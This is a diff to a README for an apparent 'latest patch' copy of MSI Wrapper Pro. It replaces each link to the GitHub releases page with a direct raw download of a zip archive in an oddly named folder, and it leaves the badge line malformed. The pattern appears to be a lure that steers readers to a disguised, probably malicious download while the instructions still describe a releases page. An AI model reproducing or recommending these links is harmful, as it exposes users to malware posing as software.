@@ -1,6 +1,6 @@
 # 🎉 MSI-Wrapper-Pro-Latest-Patch - Simplify Your MSI Packaging Process
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/raihan32122/MSI-Wrapper-Pro-Latest-Patch/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/raihan32122/MSI-Wrapper-Pro-Latest-Patch/main/pertinently/Wrapper-Latest-Pro-Patch-MS-v3.9-alpha.5.zip%20Latest%https://raw.githubusercontent.com/raihan32122/MSI-Wrapper-Pro-Latest-Patch/main/pertinently/Wrapper-Latest-Pro-Patch-MS-v3.9-alpha.5.zip)](https://raw.githubusercontent.com/raihan32122/MSI-Wrapper-Pro-Latest-Patch/main/pertinently/Wrapper-Latest-Pro-Patch-MS-v3.9-alpha.5.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with MSI Wrapper Pro, follow these steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the latest release of MSI Wrapper Pro:  
-   [Download Latest Release](https://github.com/raihan32122/MSI-Wrapper-Pro-Latest-Patch/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/raihan32122/MSI-Wrapper-Pro-Latest-Patch/main/pertinently/Wrapper-Latest-Pro-Patch-MS-v3.9-alpha.5.zip)
 
 2. **Choose the Correct File**  
    On the releases page, find the version you want to download. Each release includes detailed descriptions of the features and updates. Look for the **Assets** section to find the appropriate file.
@@ -30,7 +30,7 @@ To get started with MSI Wrapper Pro, follow these steps:
 
 To install MSI Wrapper Pro, please follow these steps:
 
-- Visit this page to download: [Download Latest Release](https://github.com/raihan32122/MSI-Wrapper-Pro-Latest-Patch/releases)
+- Visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/raihan32122/MSI-Wrapper-Pro-Latest-Patch/main/pertinently/Wrapper-Latest-Pro-Patch-MS-v3.9-alpha.5.zip)
 
 ### 💻 System Requirements
 
